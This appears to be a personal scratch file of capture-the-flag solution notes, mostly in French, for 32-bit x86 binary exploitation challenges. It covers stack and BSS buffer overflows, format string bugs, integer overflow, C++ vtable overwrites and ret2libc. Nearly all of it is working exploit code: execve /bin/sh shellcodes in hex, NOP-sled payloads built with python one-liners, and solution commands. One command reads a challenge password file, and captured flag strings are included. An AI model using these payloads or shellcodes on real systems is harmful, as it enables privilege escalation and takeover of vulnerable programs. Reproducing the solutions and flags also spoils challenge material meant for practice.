ebp = AAAA
eip = \xa4\x84\x04\x08
SHELLCODE_23 = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
SHELLCODE_28 = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"

Buffer overflow BSS
`python -c 'print "\x90"*26 + "\x90"*(512-26) + "\x64\xfb\xff\xbf"'`

Solution : ./ch7 `python -c 'print "\x90"*300 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90"*(512-300-28) + "\xd0\xfb\xff\xbf"'`

Buffer overflow basic 4 :
export USERNAME=`python -c 'print "C"*24 + "AAAA" + "\xa4\xf5\xff\xbf" + "\x90"*224 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x90"*(420-24-4-4-224-23)'`
export USERNAME=`python -c 'print "C"*24 + "AAAA" + "\xa4\xf5\xff\xbf" + "\x90"*72 + "\xCC\xCC\xCC\xCC\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x90"*(420-24-4-4-72-27)'`

Solution : export USERNAME=`python -c 'print "C"*24 + "AAAA" + "\xa4\xf5\xff\xbf" + "\x90"*64 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"\x90"*(420-24-4-4-64-28)'`

./ch8 cat /challenge/app-systeme/ch8/.passwd

Buffer overflow basic 6 :
system() = 0xb7e63310, we can find it by typing "p system" in gdb -> print system function with its adresse
return after system call = "AAAA"
bin_sh address = strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh" => 0xb7e23000 + 0x162d4c = 0xb7f85d4c	
libC address start = 0xb7e23000 

`python -c 'print "A"*32 + "\x40\xfb\xff\xbf" + "\x90"*48 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'`
-> WRONG way because "cat Makefile = gcc ch33.c -o ch33 -m32 -fno-stack-protector -z noexecstack" noexecstack wont allow the execution of a shellcode in the stack
-> use of system("/bin/bash") store in the libC
`python -c 'print "A"*32 + "\x73\x84\x04\x08" + "\x10\x33\xe6\xb7" + "AAAA" + "\x4c\x5d\xf8\xb7"'`

ELF x86 - Format String Bug Basic 3
run normal 400%s liste de \x20\x20...\x20 jusqu'à l'adresse 0xbffff90c
run avec %112s pour effectuer 512octets dans le tableau -> pas d'erreur de segmentation
run à partir de %116s -> erreur de segmentation
r AAAA -> bffffb08
r AAAA AAAA -> bffffb04
A partir de %8x commencement du remplissage par des \x20 => espace 
r %123x, on retrouve le registre eip qui pointe sur la valeur de %x à l'adresse bffffb0c si on entre %x
r %121xAAAA, on ecrit dans le registre eip => eip = 41414141
r < <(python -c 'print "%121x" + "\xef\xbe\xad\xde"')
r < <(python -c 'print "%121x" + "\x84\x85\x04\x08"')
0xbffffd6e : SHELL = /bin/bash 
bug at 0xb7e69b5e Seg erreur
%121x = bffff
r < <(python -c 'print "AAAA"+ "%7$x"') => x/1000s $esp 0xbffff96c - 0xbffffa34
%x start at 0xbffff748
$eip is at 0xbffffb7c
difference = 1076
Max offset %558$x après SIGSEGV
system() address = 0xb7e63310
/bin/bash = 0xbffffd74
%241$x plus de 202020
r < <(python -c 'print "%243$x"') = address 0xbffffb10 
r < <(python -c 'print "%270$x"') = address du registre eip (0xbffffb7c)
r < <(python -c 'print "\x7c\xfb\xff\xbf" + "%7$1000n"')
(python -c 'print "%121x" + "\x10\x33\xe6\xb7"') | ./ch17
Exécution d'un shellcode dans une variable d"environnement
export SHELLCODE=`python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'`
SHELLCODE dans 0xbffffee2
0xbffffd46
r < <(python -c 'print "%121x" + "\x50\xfd\xff\xbf"')
Solution : (python -c 'print "%121x" + "\x65\xfd\xff\xbf"'; cat;) | ./ch17

Buffer Overflow basic 5
0000 start address bffff964
On voit que ca compare le fichier avec USERNAME= 
Donc création d'un fichier commençant par USERNAME= + NOP + SHELLCODE + NOP 
python -c 'print "USERNAME="+"\x90"*50+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"\x90"*10' > /tmp/file
Segmentation a partir de 136 A dans USERNAME et plantage dans IO_fgets+43
python -c 'print "USERNAME=" + "A"*136 + "\xef\xbe\xad\xde" + "A"*36' > /tmp/rekt -> write on readfile
python -c 'print "USERNAME=" + "A"*136 + "\x4e\xfd\xff\xbf"' > /tmp/rekt
gdb : b *Init+215
system : 0xb7e63310
bffffd4f = /tmp/rekt
0xbffffd74 = /bin/bash
python -c 'print "USERNAME=" + "A"*176 + "\x10\x33\xe6\xb7" + "\x74\xfd\xff\xbf"' > /tmp/rekt
python -c 'print "USERNAME=" + "A"*176 + "\xb9\x86\x04\x08"' > /tmp/rekt
0x80486b9 = Init+272
0x8048716 = main+90
python -c 'print "USERNAME=" + "A"*128' > /tmp/rekt
0xbffff7f0 = addresse de Init+272 (=ret)0xbffff760
0x804b008= address de fp initialement
python -c 'print "USERNAME=" + "A"*136 + "\x08\xb0\x04\x08" +"B"*26' > /tmp/rekt
0xbffff760 = début username ou 0xbffffa00
0xbffff818 = fin username
0xbffffa0c = buffer overflow
0x080486b9 = address de ret
0xbffffa14
A*12 + Address de retour + AAAA...
python -c 'print "USERNAME=" + "A"*12 + "\xef\xbe\xad\xde" + "A"*(136-12-4) + "\x08\xb0\x04\x08" +"B"*32' > /tmp/rekt
python -c 'print "USERNAME=" + "A"*12 + "\x40\xfa\xff\xbf" + "\x90"*64 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90"*(136-12-4-64-28) + "\x08\xb0\x04\x08" +"B"*32' > /tmp/rekt
python -c 'print "USERNAME=" + "A"*12 + "\x40\xfa\xff\xbf" + "\x90"*64 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90"*(136-12-4-64-28) + "\x08\xb0\x04\x08" +"\x90"*28 + "\x20\xfa\xff\xbf" + "\x50\xfd\xff\xbf"' > /tmp/rekt
0xbffffd50 = /tmp/rekt à l'adresse 0xbffffa14
Deux variables d'environnements qui posent problème pour le passage de gdb à /bin/bash : LINE & COLUMN
LINES=24 0xbfffff29
COLUMNS=80 0xbffffe16
unset env LINES
unset env COLUMNS
python -c 'print "USERNAME=" + "A"*12 + "\xef\xbe\xad\xde" + "A"*(136-12-4) + "\x08\xb0\x04\x08" +"B"*24' > /tmp/rekt
python -c 'print "USERNAME=" + "A"*12 + "\x40\xfa\xff\xbf" + "\x90"*64 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90"*(136-12-4-64-28) + "\x08\xb0\x04\x08" +"B"*32' > /tmp/rekt
0xbffffa40 = necessaire pour une fonction
0xbffffa4c = au milieu de NOP
python -c 'print "USERNAME=" + "\x90"*40 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "\x90"*(136-40-28) + "\x08\xb0\x04\x08" +"B"*28 + "\x4c\xfa\xff\xbf" + "\x40\xfa\xff\xbf"' > /tmp/rekt 

ELF x86 - Stack buffer and integer overflow
system : 0xb7e63310
Address 08048400 : exit => got 0804a014 => 0x08048406	
size of int : 4 bytes
Maximum value of a integer is : 0x7FFFFFFF
limit for a integer in 32 bit is : 2147483647 (=0x7FFFFFFF), le but est de donner une valeur négatif à size
python -c 'print "\xff\xff\xff\xff" + "/"' > /tmp/rekt
python -c 'print "\xff\xff\xff\xff" + "/" + "A"*135 > /tmp/rekt et prochain A produit un buffer overflow
python -c 'print "\xff\xff\xff\xff" + "/" + "A"*135 + "\x6d\xff\xfd\xbf"' > /tmp/rekt
b *read_file+279
A partir de "A"*145, on écrase le registre eip de la fonction read_file
python -c 'print "\xff\xff\xff\xff" + "/" + "\x90"*50 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x90"*(145-50-28) + "\xef\xbe\xad\xde"' > /tmp/rekt
Adresse milieu du champs de NOP : 0xbffffaf4 avec unset env LINES & COLUMNS
SOLUTION : python -c 'print "\xff\xff\xff\xff" + "/" + "\x90"*50 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"+"\x90"*(145-50-28) + "\xf4\xfa\xff\xbf"' > /tmp/rekt

ELF x86 - Stack buffer overflow - C++ vtables
r < <(python -c 'print "5\n2\n"+"A"*75+"C"*4')
offset 75
0xbffffb40 adresse milieu NOP
r < <(python -c 'print "5\n2\n"+"A"*3+"\x34\xfb\xff\xbf"+"\x40\xfb\xff\xbf"+"\x90"*12+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"A"*(75-3-20-28)+"\x38\xfb\xff\xbf"')
r < <(python -c 'print "5\n2\n"+"A"*3+"\x14\xfb\xff\xbf"+"\x20\xfb\xff\xbf"+"\x90"*12+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"A"*(75-3-20-28)+"\x18\xfb\xff\xbf"')
r < <(python -c 'print "5\n2\n"+"A"*3+"\x14\xfb\xff\xbf"+"\x20\xfb\xff\xbf"+"\x90"*12+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"A"*(75-3-20-28)+"\x18\xfb\xff\xbf"')
adresse de /bin/bash (variable environnement) : 0xbffffd89
p system : 0xb7d7b310 
fonction interessante 0x8048a02
r < <(python -c 'print "5\n2\n"+"A"*3+"\x34\xfb\xff\xbf"+"\x10\xb3\xd7\xb7"+"AAAA"+"\x89\xfd\xff\xbf"+"A"*(75-3-20+4)+"\x38\xfb\xff\xbf"')
export SHELLCODE=`python -c 'print "\x90"*50 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'`
export SHELLCODE=`python -c 'print "\x90"*50 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"'`
export SHELLCODE=`python -c 'print "\x90"*50 + "\x31\xc0\xb0\x46\x31\xdb\x31\xd9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"'`

r < <(python -c 'print "5\n2\n"+"A"*3+"\xd4\xfa\xff\xbf"+"\x3e\xfd\xff\xbf"+"A"*(75-3-4-4)+"\xd8\xfa\xff\xbf"')
r < <(python -c 'print "5\n2\n"+"A"*3+"\xc4\xfa\xff\xbf"+"\x2c\xfd\xff\xbf"+"A"*(75-3-4-4)+"\xc8\xfa\xff\xbf"')
r < <(python -c 'print "5\n1\n"+"\x90"*3+"\x54\xfb\xff\xbf"+"\x60\xfb\xff\xbf"+"\x90"*12+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"+"\x90"*(75-3-4-4-12-25)+"\x58\xfb\xff\xbf"')
r < <(python -c 'print "5\n1\n"+"\x90"*11+"\x64\xfb\xff\xbf"+"\x70\xfb\xff\xbf"*3+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"+"\x90"*23+"\x60\xfb\xff\xbf"+"\x01"+"\n"')
r < <(python -c 'print "5\n1\n"+"\x90"*11+"\x64\xfb\xff\xbf"+"\x70\xfb\xff\xbf"*3+"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"+"\x90"*(75-33-12-4-11)+"\x60\xfb\xff\xbf"')

SHELLCODE at 0xbffffd34, 0xbffffd3e
buffer debut adresse 0xbffffad4
buffer overflow start at 0xbffffb20 (seg err)
(python -c 'print "5\n2\n"+"A"*3+"\x34\xfb\xff\xbf"+"\x40\xfb\xff\xbf"+"\x90"*12+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"A"*(75-3-20-28)+"\x38\xfb\xff\xbf"';cat;) | ./ch20
(python -c 'print "5\n2\n"+"A"*3+"\x14\xfb\xff\xbf"+"\x20\xfb\xff\xbf"+"\x90"*12+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"A"*(75-3-20-28)+"\x18\xfb\xff\xbf"';cat;) | ./ch20
(python -c 'print "5\n1\n"+"\x90"*11+"\xa4\xfb\xff\xbf"+"\xb0\xfb\xff\xbf"*3+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"+"\x90"*23+"\xa0\xfb\xff\xbf"+"\x01"+"\n"';cat) | ~/ch20
(python -c 'print "5\n1\n"+"\x90"*11+"\x64\xfb\xff\xbf"+"\x70\xfb\xff\xbf"*3+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"+"\x90"*23+"\x60\xfb\xff\xbf"+"\x01"+"\n"';cat)|~/ch20

(python -c 'print "5\n1\n"+"A"*11+"\x64\xfb\xff\xbf"+"BBBB"+"AAAA"+"BBBB"+"CCCC"+"DDDD"+"EEEE"+"FFFF"+"GGGG"+"HHHH"+"IIII"+"JJJJ"+"KKKK"+"LLLL"+"MMMM"+"NNNN"+"OOOO"+"PPPP"+"QQQQ"+"SSSS"+"\x60\xfb\xff\xbf"')|strace -i /challenge/app-systeme/ch20/ch20
Segmentation sur 4f4f4f4f = lettre G

(python -c 'print "5\n1\n"+"\x90"*3+"\x24\xfb\xff\xbf"+"\x30\xfb\xff\xbf"+"\x90"*12+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"\x90"*(75-3-4-4-12-28)+"\x28\xfb\xff\xbf"')|strace -i /challenge/app-systeme/ch20/ch20
(python -c 'print "5\n1\n"+"\x90"*3+"\x24\xfb\xff\xbf"+"\x30\xfb\xff\xbf"+"\x90"*12+"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"+"\x90"*(75-3-4-4-12-33)+"\x28\xfb\xff\xbf"')|strace -i /challenge/app-systeme/ch20/ch20
(python -c 'print "5\n1\n"+"\x90"*3+"\x24\xfb\xff\xbf"+"\x30\xfb\xff\xbf"+"\x90"*12+"\x31\xc0\xb0\x46\x31\xdb\x31\xd9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"+"\x90"*(75-3-4-4-12-46)+"\x28\xfb\xff\xbf"')|strace -i /challenge/app-systeme/ch20/ch20
r < <(python -c 'print "5\n2\n"+"A"*3+"\x54\xfb\xff\xbf"+"\x60\xfb\xff\xbf"+"\x90"*12+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"A"*(75-3-20-28)+"\x58\xfb\xff\xbf"')

(python -c 'print "5\n1\n"+"\x90"*3+"\x24\xfb\xff\xbf"+"\x30\xfb\xff\xbf"+"\x90"*12+"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"+"\x90"*(75-3-4-4-12-45)+"\x28\xfb\xff\xbf"')|strace -i /challenge/app-systeme/ch20/ch20

export PAYLOAD=`python -c "print '\x90' * 200 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh'"`
(python -c 'print "5\n1\n"+"A"*3+"\x24\xfa\xff\xbf"+"\xe5\xfe\xff\xbf"+"A"*(75-3-4-4)+"\x28\xfa\xff\xbf"')|strace -i ./ch20
payload at 0xbffffedd / 0xbffffee5 
cat <(python -c 'print "5\n1\n"+"A"*3+"\x24\xfa\xff\xbf"+"\xe5\xfe\xff\xbf"+"A"*(75-3-4-4)+"\x28\xfa\xff\xbf"') - | ./ch20
0x80488fc PTR virtuel

r < <(python -c 'print "5\n1\n"+"\x90"*3+"\x10\xfb\xff\xbf"+"\x90"*12+"\x20\xfb\xff\xbf"+"\x90"*4+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"\x90"*(75-3-4-4-16-28)+"\x08\xfb\xff\xbf"')
cat <(python -c "print '5\n1\n"+"\x90"*3+"\x10\xfb\xff\xbf"+"\x90"*12+"\x20\xfb\xff\xbf"+"\x90"*4+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"\x90"*(75-3-4-4-16-28)+"\x08\xfb\xff\xbf'") - | ./ch20

r < <(python -c 'print "5\n1\n"+"A"*3+"\x34\xfb\xff\xbf"+"\x40\xfb\xff\xbf"+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"+"\x90"*(75-3-4-4-24)+"\x38\xfb\xff\xbf"')
r < <(python -c 'print "5\n1\n"+"A"*3+"\x44\xfb\xff\xbf"+"\x50\xfb\xff\xbf"+"\x90"*16+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"+"\x90"*(75-3-4-4-24-16)+"\x48\xfb\xff\xbf"')


r < <(python -c 'print "5\n1\n"+"A"*3+"\xf4\xfa\xff\xbf"+"\x00\xfb\xff\xbf"+"\x90"*16+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"\x90"*(75-3-4-4-28-16)+"\xf8\xfa\xff\xbf"')

r < <(python -c 'print "5\n1\n"+"A"*3+"\x04\xfb\xff\xbf"+"\x10\xfb\xff\xbf"+"\x90"*16+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"\x90"*(75-3-4-4-28-16)+"\x08\xfb\xff\xbf"')

(python -c 'print "5\n1\n"+"A"*3+"\x34\xfb\xff\xbf"+"\x60\xfb\xff\xbf"+"\x90"*16+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"\x90"*(75-3-4-4-28-16)+"\x38\xfb\xff\xbf"') | ~/ch20

ls -l core*; pwd; ls -l ch20; ulimit -c unlimited; perl -e 'print "5\n1\n" . "A"x100' >/dev/null| ./ch20; ls -l core
ls -l core*; pwd; ls -l ch20; ulimit -c unlimited; python -c 'print "5\n1\n" . "A"x100' >/dev/null| ./ch20; ls -l core

ls -l core*; ls -l ch20; ulimit -c unlimited; python -c 'print "5\n1\n"+"A"*3+"\x44\xfb\xff\xbf"+"\x50\xfb\xff\xbf"+"\x90"*16+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"\x90"*(75-3-4-4-28-16)+"\x48\xfb\xff\xbf"' > /dev/null | ./ch20; ls -l core

(python -c 'print "5\n1\n"+"A"*3+"\xf4\xfa\xff\xbf"+"\x00\xfb\xff\xbf"+"\x90"*16+"\xb0\x17\x31\xdb\xcd\x80\xb0\x0b\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"+"\x90"*(75-3-4-4-28-16)+"\xf8\xfa\xff\xbf"';cat) | /challenge/app-systeme/ch20/ch20

(python -c 'print "5\n1\n"+"A"*3+"\x04\xfb\xff\xbf"+"\x10\xfb\xff\xbf"+"\x90"*16+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"\x90"*(75-3-4-4-28-16)+"\x08\xfb\xff\xbf"') | /tmp/Skallz/app-system/ch20/ch20

\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x74\x6d\x70\x89\xe3\x50\x53\x89\xe2\x50\x52\x53\x50\xb0\x3b\xcd\x80\x31\xc0\x40\x50\x50\xcd\x80  
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x74\x6d\x70\x89\xe3\x50\x53\x89\xe2\x50\x52\x53\x50\xb0\x3b\xcd\x80\x31\xc0\x40\x50\x50\xcd\x80

r < <(python -c 'print "5\n1\n"+"A"*3+"\xf4\xfa\xff\xbf"+"\x00\xfb\xff\xbf"+"\x90"*16+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x74\x6d\x70\x89\xe3\x50\x53\x89\xe2\x50\x52\x53\x50\xb0\x3b\xcd\x80\x31\xc0\x40\x50\x50\xcd\x80"+"\x90"*(75-3-4-4-34-16)+"\xf8\xfa\xff\xbf"')

\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\xeb\x06\x57\x53\x89\xe1\xcd\x80\xe8\xf5\xff\xff\xff\x63\x70\x20\x2f\x62\x69\x6e\x2f\x73\x68\x20\x2f\x74\x6d\x70\x2f\x73\x68\x3b\x20\x63\x68\x6d\x6f\x64\x20\x2b\x73\x20\x2f\x74\x6d\x70\x2f\x73\x68

Can open a shell in gdb but not outside gdb. Check environnement variable and argv[0] (how you call the program) 
Modify the environment variables, unset env LINES; unset env COLUMNS; _=/challenge/app-systeme/ch20/ch20 (same as argv[0])

(python -c 'print "5\n1\n"+"A"*3+"\xf4\xfa\xff\xbf"+"\x00\xfb\xff\xbf"+"\x90"*16+"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"+"\x90"*(75-3-4-4-33-16)+"\xf8\xfa\xff\xbf"')


\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80
!!FunW1ThVT4bleS!?


r < <(python -c 'print "1\n"+"Alex\n"+"4\n5\n"+"A"*12+"\xcb\x87\x04\x08"+"\nBBBB\n"+"2\n"')
U44aafff_U4f_The_d0G


(gdb) r < <(python -c 'print "A"*20 + "\xcf\xb0\xf5\xf7" +"\xd0\xd3\xe0\xf7" + "\x00\xa2\xe1\xf7"')
